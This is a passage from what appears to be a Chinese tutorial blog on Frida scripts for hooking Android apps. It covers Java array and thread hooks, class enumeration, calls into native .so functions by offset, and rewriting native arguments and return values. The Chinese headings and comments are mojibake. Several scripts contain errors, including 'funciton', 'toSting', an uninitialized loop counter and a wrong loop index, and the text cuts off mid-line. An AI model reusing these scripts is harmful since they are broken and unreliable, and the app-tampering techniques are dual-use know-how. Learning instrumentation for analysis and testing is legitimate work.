class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//å½“è¿”å›å€¼å’Œå‚æ•°æ˜¯ Object[]</span></span><br><span class="line">function <span class="title function_">hookFunc</span><span class="params">()</span>&#123;</span><br><span class="line">    Java.perform(function()&#123;</span><br><span class="line">        <span class="keyword">var</span> Array=Java.use(<span class="string">&quot;java.lang.reflect.Array&quot;</span>);</span><br><span class="line">        Java.use(<span class="string">&quot;xxx.xxx.xxxx&quot;</span>).funFunc.implementation=funciton(arg)&#123;</span><br><span class="line">            console.log(<span class="string">&quot;arg&quot;</span>,arg);</span><br><span class="line">            <span class="keyword">var</span> arr=arg[<span class="number">0</span>];</span><br><span class="line">            <span class="keyword">var</span> arr_len=Array.getLength(arr);</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">var</span> i;i&lt;arr_len;i++)&#123;</span><br><span class="line">                <span class="keyword">var</span> item=Array.get(arr,i);</span><br><span class="line">                <span class="keyword">var</span> item_len=Array.getLength(item);                </span><br><span class="line">                <span class="keyword">var</span> item_s=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line">                <span class="keyword">for</span>(<span class="keyword">var</span> j=<span class="number">0</span>;j&lt;item_len;j++)&#123;</span><br><span class="line">                    <span class="keyword">var</span> ch=Array.getChar(item,i);</span><br><span class="line">                    item_s+=ch+<span class="string">&#x27;,&#x27;</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                console.log(item_s);</span><br><span class="line">                </span><br><span class="line">            &#125;           </span><br><span class="line">            </span><br><span class="line">            <span class="type">var</span> <span class="variable">result</span> <span class="operator">=</span> <span class="built_in">this</span>.funFunc(arg);</span><br><span class="line">            console.log(<span class="string">&quot;result&quot;</span>,result);</span><br><span class="line">            </span><br><span class="line">            <span class="comment">//å¯¹äºè¿”å›ç»“æœçš„æ•°ç»„çš„ç¬¬4ä¸ªå…ƒç´ </span></span><br><span class="line">            <span class="keyword">var</span> arr=result[<span class="number">3</span>];</span><br><span class="line">            console.log(Array.get(arr,<span class="number">0</span>));</span><br><span class="line">            console.log(Array.get(arr,<span class="number">1</span>));</span><br><span class="line">            console.log(Array.get(arr,<span class="number">2</span>));</span><br><span class="line">            console.log(Array.get(arr,<span class="number">3</span>));</span><br><span class="line">            console.log(Array.get(arr,<span class="number">4</span>));</span><br><span class="line">            </span><br><span class="line">            result=Java.array(<span class="string">&#x27;Ljava.lang.Object;&#x27;</span>,[Java.use(<span class="string">&quot;java.lang.Integer&quot;</span>).$<span class="keyword">new</span>(<span class="number">10</span>),Java.use(<span class="string">&quot;java.lang.String&quot;</span>).$<span class="keyword">new</span>(<span class="string">&#x27;hello&#x27;</span>)])</span><br><span class="line">            <span class="keyword">return</span> result;            </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="å¤šçº¿ç¨‹">å¤šçº¿ç¨‹</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">function <span class="title function_">thread</span><span class="params">()</span>&#123;</span><br><span class="line">Java.perform(function()&#123;</span><br><span class="line">        <span class="keyword">var</span> Runnable=Java.use(<span class="string">&quot;java.lang.Runnable&quot;</span>);</span><br><span class="line">        <span class="keyword">var</span> Thread=Java.use(<span class="string">&quot;java.lang.Thread&quot;</span>);</span><br><span class="line">        <span class="keyword">var</span> MyRunnable=Java.registerClass(&#123;</span><br><span class="line">            name:<span class="string">&quot;com.xxx.xxx.murunnable&quot;</span>,</span><br><span class="line">            implements:[Runnable],</span><br><span class="line">            fields:&#123;</span><br><span class="line">                num:<span class="string">&quot;int&quot;</span>,</span><br><span class="line">                str:<span class="string">&quot;java.lang.String&quot;</span></span><br><span class="line">            &#125;,</span><br><span class="line">            methods:&#123;</span><br><span class="line">                $init:[&#123;</span><br><span class="line">                    returnType:<span class="string">&quot;void&quot;</span>,</span><br><span class="line">                    argumentTypes:[<span class="string">&#x27;int&#x27;</span>,<span class="string">&quot;java.lang.String&quot;</span>],</span><br><span class="line">                    implementation:function(num,str)&#123;</span><br><span class="line">                        <span class="built_in">this</span>.num.value=num;</span><br><span class="line">                        <span class="built_in">this</span>.str.value=str;</span><br><span class="line">                        </span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;],</span><br><span class="line">                run:function()&#123;</span><br><span class="line">                    <span class="type">var</span> <span class="variable">i</span> <span class="operator">=</span><span class="number">0</span>;</span><br><span class="line">                    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">10</span>;i++)&#123;</span><br><span class="line">                        console.log(<span class="built_in">this</span>.num.value,<span class="built_in">this</span>.str.value);</span><br><span class="line">                        <span class="built_in">this</span>.num.value=<span class="built_in">this</span>.num.value+<span class="number">1</span>;</span><br><span class="line">                        Thread.sleep(<span class="number">1000</span>);</span><br><span class="line">                        </span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;)</span><br><span class="line">        <span class="keyword">var</span> run1=MyRunnable.$<span class="keyword">new</span>(<span class="number">10</span>,<span class="string">&quot;run1&quot;</span>);</span><br><span class="line">        <span class="keyword">var</span> run2=MyRunnable.$<span class="keyword">new</span>(<span class="number">20</span>,<span class="string">&quot;run2&quot;</span>);</span><br><span class="line">        Thread.$<span class="keyword">new</span>(run1).start();</span><br><span class="line">        Thread.$<span class="keyword">new</span>(run2).start();          </span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line">setTimeout(thread,<span class="number">1000</span>);</span><br></pre></td></tr></table></figure><h2 id="å†…å­˜æœç´¢æ¥å£å®ç°ç±»">å†…å­˜æœç´¢æ¥å£å®ç°ç±»</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">function <span class="title function_">findAllInterfaces</span><span class="params">(packnames)</span>&#123;</span><br><span class="line">    Java.perform(function()&#123;</span><br><span class="line">        Java.enumerateLoadedClasses(&#123;</span><br><span class="line">            onMatch: function(class_name)&#123;</span><br><span class="line">               <span class="keyword">if</span>(class_name.indexOf(packnames)&lt;<span class="number">0</span>)&#123;</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">               &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">var</span> clazz=Java.use(class_name);</span><br><span class="line">                <span class="keyword">var</span> interfaces=clazz.class.interfaces();</span><br><span class="line">                <span class="keyword">if</span>(interfaces.length&gt;<span class="number">0</span>)&#123;</span><br><span class="line">                    console.log(class_name,<span class="string">&quot;:&quot;</span>);</span><br><span class="line">                    <span class="keyword">for</span>(<span class="keyword">var</span> i in interfaces)&#123;</span><br><span class="line">                        console.log(<span class="string">&quot;\t&quot;</span>,interfaces[i].toSting());</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">               &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            ,</span><br><span class="line">            onComplete: function()&#123;</span><br><span class="line">                console.log(<span class="string">&quot;findAllInterface send&quot;</span>);</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line">findAllInterfaces(<span class="string">&quot;è¦æŠ“å–çš„åŒ…å&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//è¾“å‡ºæŒ‡å®šçš„æ¥å£æ‰€åœ¨çš„ç±»</span></span><br><span class="line">function <span class="title function_">findImpByInterface</span><span class="params">(packnames,interfaceName)</span>&#123;</span><br><span class="line">    Java.perform(function()&#123;</span><br><span class="line">        Java.enumerateLoadedClasses(&#123;</span><br><span class="line">            onMatch: function(class_name)&#123;</span><br><span class="line">               <span class="keyword">if</span>(class_name.indexOf(packnames)&lt;<span class="number">0</span>)&#123;</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">               &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">var</span> clazz=Java.use(class_name);</span><br><span class="line">                <span class="keyword">var</span> interfaces=clazz.class.interfaces();</span><br><span class="line">                <span class="keyword">if</span>(interfaces.length&gt;<span class="number">0</span>)&#123;                </span><br><span class="line">                    <span class="keyword">for</span>(<span class="keyword">var</span> i in interfaces)&#123;</span><br><span class="line">                        <span class="keyword">if</span>(interfaces[i].toSting().indexOf(interfaceName))&#123;</span><br><span class="line">                            console.log(class_name,<span class="string">&quot;:&quot;</span>,interfaces[i].toSting());</span><br><span class="line">                            </span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">               &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            ,</span><br><span class="line">            onComplete: function()&#123;</span><br><span class="line">                console.log(<span class="string">&quot;findAllInterface send&quot;</span>);</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="æŠ½è±¡ç±»-çˆ¶ç±»">æŠ½è±¡ç±»(çˆ¶ç±»)</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">findAllSuperclasses</span>(<span class="params">packnames</span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="title class_">Java</span>.<span class="title function_">enumerateLoadedClasses</span>(&#123;</span><br><span class="line">            <span class="attr">onMatch</span>: <span class="keyword">function</span>(<span class="params">class_name</span>)&#123;</span><br><span class="line">               <span class="keyword">if</span>(class_name.<span class="title function_">indexOf</span>(packnames)&lt;<span class="number">0</span>)&#123;</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">               &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">var</span> clazz=<span class="title class_">Java</span>.<span class="title function_">use</span>(class_name);</span><br><span class="line">                <span class="keyword">var</span> superClass=clazz.<span class="property">class</span>.<span class="title function_">getSuperclass</span>();</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(class_name,<span class="string">&quot;:&quot;</span>)</span><br><span class="line">          <span class="keyword">while</span>(superClass!=<span class="literal">null</span>)&#123;</span><br><span class="line">                    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;\t&quot;</span>,superClass.<span class="title function_">toString</span>());</span><br><span class="line">                    superClass=superClass.<span class="title function_">getSuperclass</span>();</span><br><span class="line">                    </span><br><span class="line">                &#125;</span><br><span class="line">               &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            ,</span><br><span class="line">            <span class="attr">onComplete</span>: <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;findAllSuperclasses send&quot;</span>);</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//å¯»æ‰¾çˆ¶ç±»çš„å­ç±»</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">findChildBySuper</span>(<span class="params">packnames,superClassName</span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="title class_">Java</span>.<span class="title function_">enumerateLoadedClasses</span>(&#123;</span><br><span class="line">            <span class="attr">onMatch</span>: <span class="keyword">function</span>(<span class="params">class_name</span>)&#123;</span><br><span class="line">               <span class="keyword">if</span>(class_name.<span class="title function_">indexOf</span>(packnames)&lt;<span class="number">0</span>)&#123;</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">               &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">var</span> clazz=<span class="title class_">Java</span>.<span class="title function_">use</span>(class_name);</span><br><span class="line">                <span class="keyword">var</span> superClass=clazz.<span class="property">class</span>.<span class="title function_">getSuperclass</span>();              </span><br><span class="line">          <span class="keyword">while</span>(superClass!=<span class="literal">null</span>)&#123;</span><br><span class="line">                    <span class="keyword">if</span>(superClass.<span class="title function_">toString</span>().<span class="title function_">indexOf</span>(superClassName)&gt;=<span class="number">0</span>)&#123;</span><br><span class="line">                       <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Found:&quot;</span>,class_name,superClass); </span><br><span class="line">                    &#125;</span><br><span class="line">                    superClass=superClass.<span class="title function_">getSuperclass</span>();</span><br><span class="line">                    </span><br><span class="line">                &#125;</span><br><span class="line">               &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            ,</span><br><span class="line">            <span class="attr">onComplete</span>: <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;findAllSuperclasses send&quot;</span>);</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1>Hook soå±‚</h1><h2 id="ä¸€äº›fridaå‡½æ•°ç®€å•ä½¿ç”¨">ä¸€äº›fridaå‡½æ•°ç®€å•ä½¿ç”¨</h2><ul><li><p>Java.vm.getEnv() / Java.vm.tryGetEnvï¼šfridaä¸­è·å–JNIEnvå¯¹è±¡</p></li><li><p>Java.vm.getEnv().newStringUtf(str)ï¼šstringè½¬åŒ–ä¸ºjstring</p></li><li><p>Java.vm.getEnv().getStringUtfChars(result, null).readCString()ï¼šjstringè½¬åŒ–ä¸ºstring</p></li><li><p>Memory.allocUtf8String(â€œxiaoweigegeâ€)ï¼šsoä¸­å®šä¹‰ä¸€ä¸ªå­—ç¬¦ä¸²</p></li><li><p>ptr(result).readCString()ï¼šcä¸­å­—ç¬¦ä¸²è½¬åŒ–ä¸ºjstring</p></li><li><p>GetByteArrayElements(): jArrayè½¬åŒ–ä¸ºcArray</p></li><li><p>Java.retain(instance)ï¼šå‚æ•°æ˜¯ä¸€ä¸ªå‚æ•°å¯¹è±¡ å½“å¯¹è±¡è¢«æ‘§æ¯æ—¶ é€šè¿‡èµ‹å€¼ä»ç„¶å¯ä»¥è°ƒç”¨è¿™ä¸ªå¯¹è±¡</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//å°†å‡½æ•°åœ°å€å®šä¹‰æˆä¸€ä¸ªå‡½æ•°èƒ½åœ¨jsä¸­è¿›è¡Œè°ƒç”¨</span></span><br><span class="line"><span class="keyword">let</span> so_addr = <span class="title class_">Module</span>.<span class="title function_">findBaseAddress</span>(<span class="string">&#x27;libxiaowei.so&#x27;</span>);</span><br><span class="line"><span class="keyword">let</span> encrypt_addr = so_addr.<span class="title function_">add</span>(<span class="number">0x42B0</span>);</span><br><span class="line"><span class="keyword">let</span> encrypt_fun = <span class="keyword">new</span> <span class="title class_">NativeFunction</span>(encrypt_addr, <span class="string">&#x27;pointer&#x27;</span>, [<span class="string">&#x27;pointer&#x27;</span>]);</span><br><span class="line"><span class="keyword">let</span> cstring = <span class="title class_">Memory</span>.<span class="title function_">allocUtf8String</span>(str);</span><br><span class="line"><span class="keyword">let</span> result = <span class="title function_">encrypt_fun</span>(cstring);</span><br></pre></td></tr></table></figure></li><li><p>Module.load(â€˜/data/local/tmp/libxiaowei.soâ€™)ï¼šåœ¨ä»»æ„apkä¸­åŠ è½½so</p></li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">hexToBytes</span>(<span class="params">str</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> pos = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">var</span> len = str.<span class="property">length</span>;</span><br><span class="line">    <span class="keyword">if</span> (len % <span class="number">2</span> != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    len /= <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">var</span> hexA = <span class="keyword">new</span> <span class="title class_">Array</span>();</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; len; i++) &#123;</span><br><span class="line">        <span class="keyword">var</span> s = str.<span class="title function_">substr</span>(pos, <span class="number">2</span>);</span><br><span class="line">        <span class="keyword">var</span> v = <span class="built_in">parseInt</span>(s, <span class="number">16</span>);</span><br><span class="line">        hexA.<span class="title function_">push</span>(v);</span><br><span class="line">        pos += <span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> hexA;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">stringToBytes</span>(<span class="params">str</span>) &#123;  </span><br><span class="line">    <span class="keyword">var</span> ch, st, re = []; </span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; str.<span class="property">length</span>; i++ ) &#123; </span><br><span class="line">        ch = str.<span class="title function_">charCodeAt</span>(i);  </span><br><span class="line">        st = [];                 </span><br><span class="line">        <span class="keyword">do</span> &#123;  </span><br><span class="line">            st.<span class="title function_">push</span>( ch &amp; <span class="number">0xFF</span> );  </span><br><span class="line">            ch = ch &gt;&gt; <span class="number">8</span>;          </span><br><span class="line">        &#125;    </span><br><span class="line">        <span class="keyword">while</span> ( ch );  </span><br><span class="line">        re = re.<span class="title function_">concat</span>( st.<span class="title function_">reverse</span>() ); </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">return</span> re;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="æšä¸¾å¯¼å…¥å¯¼å‡ºè¡¨">æšä¸¾å¯¼å…¥å¯¼å‡ºè¡¨</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">hookTest1</span>(<span class="params"></span>)&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> imports = <span class="title class_">Module</span>.<span class="title function_">enumerateImports</span>(<span class="string">&quot;libxiaojianbang.so&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; imports.<span class="property">length</span>; i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(imports[i].<span class="property">name</span> == <span class="string">&quot;strncat&quot;</span>)&#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(imports[i]));</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(imports[i].<span class="property">address</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">var</span> <span class="built_in">exports</span> = <span class="title class_">Module</span>.<span class="title function_">enumerateExports</span>(<span class="string">&quot;libxiaojianbang.so&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="built_in">exports</span>.<span class="property">length</span>; i++)&#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(<span class="built_in">exports</span>[i]));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// var helloAddr = Module.findExportByName(&quot;libxiaojianbang.so&quot;, &quot;Java_com_xiaojianbang_app_NativeHelper_helloFromC&quot;);</span></span><br><span class="line">    <span class="comment">// console.log(helloAddr);</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">//æšä¸¾ç¬¦å·è¡¨ Module.enumerateSymbols(&#x27;xxx.so&#x27;)ï¼›</span></span><br></pre></td></tr></table></figure><h2 id="Hookå¯¼å‡ºå‡½æ•°">Hookå¯¼å‡ºå‡½æ•°</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">hookTest2</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> helloAddr = <span class="title class_">Module</span>.<span class="title function_">findExportByName</span>(<span class="string">&quot;libxiaojianbang.so&quot;</span>, <span class="string">&quot;Java_com_xiaojianbang_app_NativeHelper_add&quot;</span>);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(helloAddr);</span><br><span class="line">    <span class="keyword">if</span>(helloAddr != <span class="literal">null</span>)&#123;</span><br><span class="line">        <span class="title class_">Interceptor</span>.<span class="title function_">attach</span>(helloAddr,&#123;</span><br><span class="line">            <span class="attr">onEnter</span>: <span class="keyword">function</span>(<span class="params">args</span>)&#123;</span><br><span class="line">                <span class="comment">//console.log(args[0]);</span></span><br><span class="line">                <span class="comment">//console.log(args[1]);</span></span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(args[<span class="number">2</span>]);</span><br><span class="line">                <span class="comment">//console.log(this.context.x2);</span></span><br><span class="line">                <span class="comment">//console.log(args[3]);</span></span><br><span class="line">                <span class="comment">//console.log(args[4].toInt32());</span></span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="attr">onLeave</span>: <span class="keyword">function</span>(<span class="params">retval</span>)&#123;</span><br><span class="line">                <span class="comment">//console.log(retval);</span></span><br><span class="line">                <span class="comment">//console.log(&quot;retval&quot;, retval.toInt32());</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//toInt32 è½¬æ¢ä¸º32æœ‰ç¬¦å·æ•´æ•°</span></span><br></pre></td></tr></table></figure><h2 id="ä¿®æ”¹å‡½æ•°å‚æ•°è¿”å›å€¼">ä¿®æ”¹å‡½æ•°å‚æ•°è¿”å›å€¼</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">hookTest3</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> helloAddr = <span class="title class_">Module</span>.<span class="title function_">findExportByName</span>(<span class="string">&quot;libxiaojianbang.so&quot;</span>, <span class="string">&quot;Java_com_xiaojianbang_app_NativeHelper_add&quot;</span>);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(helloAddr);</span><br><span class="line">    <span class="keyword">if</span>(helloAddr != <span class="literal">null</span>)&#123;</span><br><span class="line">        <span class="title class_">Interceptor</span>.<span class="title function_">attach</span>(helloAddr,&#123;</span><br><span class="line">            <span class="attr">onEnter</span>: <span class="keyword">function</span>(<span class="params">args</span>)&#123;</span><br><span class="line">                <span class="comment">//ä¿®æ”¹å‡½æ•°å‚æ•°çš„æ—¶å€™ï¼Œå¦‚æœå‚æ•°æ˜¯å­—ç¬¦ä¸² æ²¡æ³•ä¿®æ”¹</span></span><br><span class="line">                args[<span class="number">2</span>] = <span class="title function_">ptr</span>(<span class="number">1000</span>); <span class="comment">//new NativePointer()  ä¿®æ”¹å‚æ•°ä¸º1000</span></span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(args[<span class="number">2</span>].<span class="title function_">toInt32</span>());</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(args[<span class="number">3</span>]);</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(args[<span class="number">4</span>]);</span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="attr">onLeave</span>: <span class="keyword">function</span>(<span class="params">retval</span>)&#123;</span><br><span class="line">                retval.<span class="title function_">replace</span>(<span class="number">20000</span>);   <span 